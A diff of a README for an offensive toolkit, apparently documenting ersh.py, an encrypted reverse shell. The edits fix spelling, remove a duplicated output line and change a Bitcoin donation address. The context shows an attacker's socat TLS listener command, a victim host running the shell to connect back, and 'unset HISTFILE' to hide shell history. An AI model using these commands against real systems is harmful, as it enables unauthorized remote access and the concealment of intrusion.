@@ -347,7 +347,7 @@ python - <<'EOF'
 
 ### Sample output
 
-On the reciever machine:
+On the receiver machine:
 
 ```
 root@attacker:~/freedomfighting# socat openssl-listen:8080,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
@@ -361,11 +361,10 @@ root@victim:~# python ersh.py
 root@victim:~#
 ```
 
-And on the reciever again:
+And on the receiver again:
 
 ```
 root@attacker:~/freedomfighting# socat openssl-listen:8080,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
-unset HISTFILE
 root@victim:~# unset HISTFILE
 root@victim:~#
 ```
@@ -374,7 +373,7 @@ root@victim:~#
 
 ### Donations
 These scripts are 100% free. I do like Bitcoins though, so if you want to send some my way, here's an address you can
-use: ```19wFVDUWhrjRe3rPCsokhcf1w9Stj3Sr6K```
+use: ```1PUeq8FfyqvyJqA1Eb23qHrnkdPknt4aKF```
 Feel free to drop me a line if you donate to the project, so I can thank you personally!
 
 ### Contact
